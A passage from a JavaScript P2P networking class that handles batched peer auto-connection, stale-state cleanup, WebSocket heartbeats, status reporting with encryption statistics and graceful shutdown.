      `[P2P-AUTO] Auto-connecting to ${availablePeers.length} peers (${referralCount} from referrals)...`
    );
    this.stats.lastAutoConnect = Date.now();
    
    const maxParallel = 3;
    for (let i = 0; i < availablePeers.length; i += maxParallel) {
      if (this.isShuttingDown) break;
      
      const currentTotal = this.peers.size + this.connectionLocks.size;
      if (currentTotal >= this.p2pConfig.maxPeers) {
        console.log('[P2P-AUTO] Max peers reached mid-batch, stopping');
        break;
      }
      
      const batch = availablePeers.slice(i, i + maxParallel);
      
      await Promise.all(
        batch.map(async peer => {
          const checkTotal = this.peers.size + this.connectionLocks.size;
          if (checkTotal >= this.p2pConfig.maxPeers) return;
          
          try {
            const result = await this.connectToPeer(peer.nodeId, peer);
            if (result.success) {
              const source = peer.fromReferral ? `referral from ${peer.referredBy}` : 'discovery';
              console.log(
                `[P2P-AUTO] Connected to ${peer.nodeId} at ${peer.ip}:${peer.port} ` +
                `(${peer.mode}) via ${source}`
              );
              
              if (peer.fromReferral) {
                this.stats.connectionsViaReferral++;
              }
            } else if (!result.willRetry) {
              console.log(
                `[P2P-AUTO] Failed to connect to ${peer.nodeId}: ${result.error}`
              );
            }
          } catch (error) {
            console.error(
              `[P2P-AUTO] Error connecting to ${peer.nodeId}:`,
              error.message
            );
          }
        })
      );
      
      if (i + maxParallel < availablePeers.length) {
        await new Promise(resolve => setTimeout(resolve, 2000));
      }
    }
  }
  
  startPeerCleanup() {
    if (this.peerCleanupInterval) {
      clearInterval(this.peerCleanupInterval);
    }
    
    this.peerCleanupInterval = setInterval(() => {
      if (this.isShuttingDown) return;
      
      const now = Date.now();
      const timeout = this.p2pConfig.peerTimeout;
      
      let removedKnown = 0;
      for (const [nodeId, peer] of this.knownPeers) {
        if (now - peer.lastUpdate > timeout * 2) {
          this.knownPeers.delete(nodeId);
          removedKnown++;
        }
      }
      if (removedKnown > 0) {
        console.log(`[P2P-CLEANUP] Removed ${removedKnown} stale peer info(s)`);
      }
      
      let removedConnections = 0;
      for (const [nodeId, peer] of this.peers) {
        if (now - peer.lastSeen > timeout) {
          console.log(`[P2P-CLEANUP] Peer ${nodeId} timed out`);
          try { peer.ws.close(); } catch {}
          this.peers.delete(nodeId);
          this.connectionLocks.delete(nodeId);
          removedConnections++;
        }
      }
      if (removedConnections > 0) {
        console.log(`[P2P-CLEANUP] Removed ${removedConnections} stale connection(s)`);
      }
      
      let removedLocks = 0;
      for (const [nodeId, lockTime] of this.connectionLocks) {
        if (now - lockTime > this.p2pConfig.connectionLockTimeout) {
          this.connectionLocks.delete(nodeId);
          removedLocks++;
        }
      }
      if (removedLocks > 0) {
        console.log(`[P2P-CLEANUP] Removed ${removedLocks} stale lock(s)`);
      }
      
      let removedQueues = 0;
      for (const [nodeId, queue] of this.messageQueue) {
        const filtered = queue.filter(item => now - item.timestamp < 300000);
        if (filtered.length === 0) {
          this.messageQueue.delete(nodeId);
          removedQueues++;
        } else if (filtered.length < queue.length) {
          this.messageQueue.set(nodeId, filtered);
        }
      }
      if (removedQueues > 0) {
        console.log(`[P2P-CLEANUP] Removed ${removedQueues} empty message queue(s)`);
      }
      
      let removedBlacklist = 0;
      for (const [nodeId, entry] of this.peerBlacklist) {
        if (now > entry.until) {
          this.peerBlacklist.delete(nodeId);
          removedBlacklist++;
        }
      }
      if (removedBlacklist > 0) {
        console.log(`[P2P-CLEANUP] Removed ${removedBlacklist} expired blacklist entry(ies)`);
      }
      
      let removedReferrals = 0;
      for (const [nodeId, timestamp] of this.referralTimestamps) {
        if (now - timestamp > this.p2pConfig.referralExpiryMs) {
          this.receivedReferrals.delete(nodeId);
          this.referralTimestamps.delete(nodeId);
          removedReferrals++;
        }
      }
      if (removedReferrals > 0) {
        console.log(`[P2P-CLEANUP] Removed ${removedReferrals} expired referral set(s)`);
      }
      
      let removedPropagationLocks = 0;
      for (const [version, timestamp] of this.methodUpdatePropagationLock) {
        if (now - timestamp > this.p2pConfig.propagationCooldown) {
          this.methodUpdatePropagationLock.delete(version);
          removedPropagationLocks++;
        }
      }
      if (removedPropagationLocks > 0) {
        console.log(`[P2P-CLEANUP] Removed ${removedPropagationLocks} stale propagation lock(s)`);
      }
      
    }, this.p2pConfig.cleanupInterval);
    
    console.log('[P2P-CLEANUP] Peer cleanup started');
  }
  
  startPeerHeartbeat() {
    if (this.heartbeatInterval) {
      clearInterval(this.heartbeatInterval);
    }
    
    this.heartbeatInterval = setInterval(() => {
      if (this.isShuttingDown) return;
      
      for (const [nodeId, peer] of this.peers) {
        try {
          if (peer.ws.readyState === WebSocket.OPEN) {
            peer.ws.ping();
          }
        } catch (error) {
          console.error(`[P2P-HEARTBEAT] Error pinging ${nodeId}:`, error.message);
        }
      }
      
      const now = Date.now();
      if (!this.lastMasterCheck || (now - this.lastMasterCheck > 60000)) {
        this.checkMasterConnectivity();
      }
      
    }, this.p2pConfig.heartbeatInterval);
    
    console.log(
      `[P2P-HEARTBEAT] Peer heartbeat started (${this.p2pConfig.heartbeatInterval}ms)`
    );
  }
  
  getStatus() {
    const methodsCount = Object.keys(this.methodsConfig).length;
    const messageQueueTotal = Array.from(this.messageQueue.values())
      .reduce((sum, queue) => sum + queue.length, 0);

    const referralStats = {
      referralsSent: this.stats.referralsSent,
      referralsReceived: this.stats.referralsReceived,
      connectionsViaReferral: this.stats.connectionsViaReferral,
      storedReferrals: this.receivedReferrals.size
    };
    
    const cleanupStats = {
      requestHandlersCleaned: this.stats.requestHandlersCleaned,
      memoryLeaksPrevent: this.stats.memoryLeaksPrevent,
      activeHandlers: this.requestHandlers.size
    };
    
    const encryptionStats = {
      encryptedMessagesSent: this.stats.encryptedMessagesSent,
      encryptedMessagesReceived: this.stats.encryptedMessagesReceived,
      plainMessagesSent: this.stats.plainMessagesSent,
      plainMessagesReceived: this.stats.plainMessagesReceived,
      totalMessages: this.stats.messagesSent + this.stats.messagesReceived,
      encryptionRate: this.stats.messagesSent > 0 
        ? ((this.stats.encryptedMessagesSent / this.stats.messagesSent) * 100).toFixed(2) + '%'
        : 'N/A'
    };
    
    return {
      enabled: this.p2pConfig.enabled,
      nodeId: this.nodeId,
      nodeIp: this.nodeIp,
      nodePort: this.nodePort,
      nodeMode: this.nodeMode,
      serverReady: this.isServerReady,
      masterReachable: this.masterReachable,
      encryption: this.isEncryptionEnabled(),
      methodsVersion: this.methodsVersionHash?.substring(0, 8),
      methodsCount,
      preferP2PSync: this.p2pConfig.preferP2PSync,
      peers: {
        connected: this.peers.size,
        known: this.knownPeers.size,
        max: this.p2pConfig.maxPeers,
        locks: this.connectionLocks.size,
        blacklisted: this.peerBlacklist.size,
        fromReferrals: Array.from(this.knownPeers.values()).filter(p => p.fromReferral).length
      },
      messageQueue: {
        peers: this.messageQueue.size,
        totalMessages: messageQueueTotal
      },
      stats: { 
        ...this.stats,
        referralStats,
        cleanupStats,
        encryptionStats,
        successRate: this.stats.connectionAttempts > 0 
          ? ((this.stats.connectionSuccesses / this.stats.connectionAttempts) * 100).toFixed(2) + '%'
          : 'N/A'
      },
      config: {
        autoConnect: this.p2pConfig.autoConnect,
        relayFallback: this.p2pConfig.relayFallback,
        maxPeers: this.p2pConfig.maxPeers,
        maxReferrals: this.p2pConfig.maxReferralsToSend,
        discoveryInterval: this.p2pConfig.discoveryInterval,
        methodSyncInterval: this.p2pConfig.methodSyncInterval,
        maxPropagationHops: this.p2pConfig.maxPropagationHops
      },
      connectedPeers: Array.from(this.peers.entries()).map(([nodeId, peer]) => ({
        nodeId,
        ip: peer.ip,
        port: peer.port,
        mode: peer.mode,
        direct: peer.direct,
        lastSeen: peer.lastSeen,
        lastHeartbeat: peer.lastHeartbeat,
        messagesReceived: peer.messagesReceived,
        messagesSent: peer.messagesSent,
        connectedAt: peer.connectedAt,
        uptime: Date.now() - peer.connectedAt,
        capabilities: peer.capabilities,
        methodsVersion: peer.methodsVersion?.substring(0, 8),
        methodsCount: peer.methodsCount,
        supportsEncryption: peer.supportsEncryption,
        encryptedMessages: peer.encryptedMessages,
        plainMessages: peer.plainMessages
      })),
      knownPeers: Array.from(this.knownPeers.values()).map(peer => ({
        nodeId: peer.nodeId,
        ip: peer.ip,
        port: peer.port,
        mode: peer.mode,
        reachable: peer.reachable,
        connected: this.peers.has(peer.nodeId),
        locked: this.connectionLocks.has(peer.nodeId),
        blacklisted: this.isBlacklisted(peer.nodeId),
        methodsVersion: peer.methodsVersion?.substring(0, 8),
        methodsCount: peer.methodsCount,
        fromReferral: peer.fromReferral || false,
        referredBy: peer.referredBy || null,
        supportsEncryption: peer.supportsEncryption || false
      }))
    };
  }
  
  cleanup() {
    if (this.wss) {
      try {
        this.wss.close();
      } catch {}
      this.wss = null;
    }
    this.isServerReady = false;
  }
  
  shutdown() {
    console.log('[P2P] Shutting down P2P node...');
    this.isShuttingDown = true;
    
    if (this.discoveryInterval) {
      clearInterval(this.discoveryInterval);
      this.discoveryInterval = null;
    }
    if (this.peerCleanupInterval) {
      clearInterval(this.peerCleanupInterval);
      this.peerCleanupInterval = null;
    }
    if (this.heartbeatInterval) {
      clearInterval(this.heartbeatInterval);
      this.heartbeatInterval = null;
    }
    if (this.autoConnectInterval) {
      clearInterval(this.autoConnectInterval);
      this.autoConnectInterval = null;
    }
    if (this.methodSyncInterval) {
      clearInterval(this.methodSyncInterval);
      this.methodSyncInterval = null;
    }
    if (this.handlerCleanupInterval) {
      clearInterval(this.handlerCleanupInterval);
      this.handlerCleanupInterval = null;
    }
    
    console.log(`[P2P] Cleaning up ${this.requestHandlers.size} request handlers...`);
    for (const [, value] of this.requestHandlers) {
      const { eventName, handler } = value;
      this.removeListener(eventName, handler);
    }
    this.requestHandlers.clear();
    this.requestHandlerTimestamps.clear();
    
    const goodbyeMessage = {
      type: 'goodbye',
      nodeId: this.nodeId,
      timestamp: Date.now()
    };
    
    for (const [nodeId, peer] of this.peers) {
      try {
        const encrypted = this.encryptMessage(goodbyeMessage, 'goodbye');
        this.sendToPeer(nodeId, encrypted.data);
        
        setTimeout(() => {
          try { peer.ws.close(); } catch {}
        }, 500);
        
      } catch {}
    }
    
    setTimeout(() => {
      this.peers.clear();
      this.knownPeers.clear();
      this.connectionLocks.clear();
      this.messageQueue.clear();
      this.peerBlacklist.clear();
      this.receivedReferrals.clear();
      this.referralTimestamps.clear();
      this.methodUpdatePropagationLock.clear();
    }, 1000);
    
    this.cleanup();
    this.removeAllListeners();
    
    console.log('[P2P] P2P node shutdown complete');
    console.log(`[P2P] Encryption stats - Sent: ${this.stats.encryptedMessagesSent} encrypted, ${this.stats.plainMessagesSent} plain`);
    console.log(`[P2P] Encryption stats - Received: ${this.stats.encryptedMessagesReceived} encrypted, ${this.stats.plainMessagesReceived} plain`);
  }
}

export default P2PHybridNode;